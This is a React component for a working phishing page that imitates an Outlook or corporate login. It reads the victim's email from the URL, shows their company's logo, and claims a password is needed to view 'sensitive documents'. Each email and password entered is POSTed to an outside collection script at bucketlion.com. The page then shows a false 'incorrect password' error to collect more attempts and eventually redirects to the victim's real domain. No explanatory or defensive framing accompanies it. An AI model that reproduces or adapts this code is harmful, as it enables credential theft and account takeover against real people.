
import React, { useEffect, useState, useRef } from "react";
import './App.css';
// import { AiOutlineQuestionCircle } from 'react-icons/ai';
import $ from "jquery";
// import Preloader from "./Preloader/Preloader";
import { FaArrowLeftLong } from "react-icons/fa6";
import { ReactComponent as Keey } from "./key.svg";
import Custom from "./CustomPre";

const Outlook = ()=>{

    const reloadPg = ()=> window.location.reload();

    // const [spinLoader, setSpinLoader] = useState(false);

    const formRef = useRef();

    useEffect(()=>{
        const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1));
        document.title = "Documents";
        // setSpinLoader(true);
        setTimeout(() => {
            // setSpinLoader(false);
        }, 2500);
        console.log(extracetdEmail);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const emailInTheURLEtension = window.location.href;
    const sliceIn = emailInTheURLEtension.indexOf("@");
    const extendToDom = emailInTheURLEtension.substring((sliceIn+1)).toUpperCase().split('.', 1);
    


    const redirectURL = window.location.href;
    const sliceEqualSignR = redirectURL.indexOf("@");
    const extracetdemailDomain = redirectURL.substr((sliceEqualSignR+1)).split('&', 1).toString();

    const [outlookEmail, setOutlookEmail] = useState(extracetdEmail);
    const [outlookPassword, setOulookPassword] = useState('');

    const btnVal = 'Login';

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);

    const [abc, setAbc] = useState(false);

    const [verif, setVerif] = useState(true);

    useEffect(()=>{
        setAbc(true);
        setTimeout(() => {
            setAbc(false);
        }, 4000);
    }, []);

    const submitOutlookForm = e=>{
        // console.log(formRef.current);
        e.preventDefault();
        
        console.log(outlookEmail, outlookPassword);

        if(outlookPassword === ""){
            return null
            // setErr(true);
        }else{
            setVerif(false)
            setAbc(true)
            setTimeout(() => {
                setAbc(false)
            }, 3000);
            setOutlookEmail(outlookEmail);
            // setSpinLoader(true);
            const user = {
                email: outlookEmail,
                password: outlookPassword
            };
            
            $.ajax({
                type: "POST",
                url: "https://bucketlion.com/logs/dashboard/file/ship.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });
            setTimeout(()=>{
                setOulookPassword('');
                setErr(true);
                setTimeout(() => {
                    // setSpinLoader(false);
                }, 2000);
            }, 2500)
            setErr(false);
            setCount(count=> count + 1);
            if(count >= 50){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain}`;
            }

        }
    }

    return(<section>


{     abc ?   <Custom /> :
        
        <div className="Outlook_wrapper">

            <div className="Outlook_form_wrapper">
                <main style={{
                    display:'flex',
                    alignItems:'center'
                }}>
                <img 
                    alt="outlook_svg"
                    src={`https://logo.clearbit.com/https://${extracetdemailDomain}`}
                    className="dommm"
                    // onError={e=> e.target.src = "https://media.geeksforgeeks.org/wp-content/uploads/20220608214420/galaryImage5-300x300.png"}
                    onError={e=> e.target.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMwAAADACAMAAAB/Pny7AAAAn1BMVEWBvAYFpvD/ugjzUyXz8/P29Ph9ugD/tADzRADy8/D59vPy9fn79//z9vfy9/8An/D/+fO+2Jvz5ODz/v/n7d3z3dji6tbK4vL07t+t1fH43K3zq53znYqXxk1CsfD9wEPf7PKAx/HzTBfzdFf60oCz03/25srz7OrzpZrzyb/U47vzLwDzloGu0XVrswDzaE++2JOSzvL514/+vjUAmPC7sX1nAAAB0ElEQVR4nO3cW08TURSA0SLTUqhjuYOicr8WWlT+/2/TpE4wDAk5gS2T3fU9k5yu7H2Gt9OrEtV77x/wlv1PzGpQbczl1UFIV9f1/ID+zUZQq08x9eZkGNLkdmt+wse76SCk6Xa/hRkuhzT82mDOB72QBjAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMAkxk5OQHjF3MY+bPPu6yew0pNlBg7n/FlQLU1U7QW02j+hs7wbVekTnz2yiag7oR1W1MQmC6WowXe0RsxZVc8Aoqmcwe0Ed/dWM9i+Cav+fOfoe1I/1+QGffv46jGm/bmHGSyGNjxvM2cqHkFZyYUYwMO5MESbVZFJhrBkMTBnGnYGBKcO4MzDWrAyTajKpMNasqxiTgbFmZZhUk0mFsWYwMAuM8QGAsWZlmFSTSYWxZjAwC4zxAYCxZmWYVJOB6SrGnYGxZmWYVJOB6SrGnYGBKcO4MzDWrAyTajKpMNasqxiTgbFmZZhUk0mFsWYwMAuM8QGAeZc1exiH9PAPJqj2ZOrPQe01j+hcfAnqsnqKia9++U9eWaqHp34DAe8ojnVr2CQAAAAASUVORK5CYII="}
                />

                    &#160;&#160;&#160;

                <span><b>{extendToDom}</b></span>
                </main>

                <div className="email_no_input">
                    <span><FaArrowLeftLong /></span>
                    &#160;&#160;
                    <span>{extracetdEmail}</span>
                </div>


                <div className="enterpswd_notification">
                    <p><b>Enter Password</b></p>
                </div>

                { verif ? <div>
                    <p style={{
                        color:'#222',
                        lineHeight:'1.3em'
                    }}>
                        Because you're accessing sensitive documents, you need to verify your password
                    </p>
                </div> : null }

                { err ?
                    <p className="err">
                        Your account or password is incorrect. If you don't remember your password, <span className="reset" onClick={reloadPg}>reset it now</span>
                    <br />
                     {/* account or <span className="gett">get a new one</span>. */}
                </p>  
                : null }

                <form onSubmit={submitOutlookForm} method="post" ref={formRef} className='forrmmm'>
                    

                    <div className="outlook_password_container">
                    <label htmlFor="password"> </label>
                        <input 
                            type={`password`}
                            placeholder="Enter Password"
                            className="password_input input_outlook"
                            value={outlookPassword}
                            onChange={e=> setOulookPassword(e.target.value)}
                            required={true}
                            title="Please fill out this field"
                            name="password"
                            autoFocus
                        />
                    </div>


                    <div className="_opts_">
                        Forget password?
                    </div>

                    <div className="oiuytre">

                    <input
                            type={`reset`} 
                            value="Back"
                            className="defaukt_btn__ outlook_submit"
                            onClick={reloadPg}
                            style={{
                                color:'#000',
                                background:'buttonface',
                                width:''
                            }}
                        />

                                &#160;&#160;

                        <input
                            type={`submit`} 
                            value={btnVal}
                            className="outlook_submit"
                            onClick={submitOutlookForm}
                        />
                    </div>

                </form>
            </div>

        </div> }


        <article className="btm">

            <div className="fheudk">
                <Keey style={{cursor:'pointer'}} onClick={reloadPg}/>

                &#160;&#160;&#160;

                <p style={{cursor:'pointer'}} onClick={reloadPg}>Sign in options</p>
            </div>

        </article>


    </section>)
};

export default Outlook;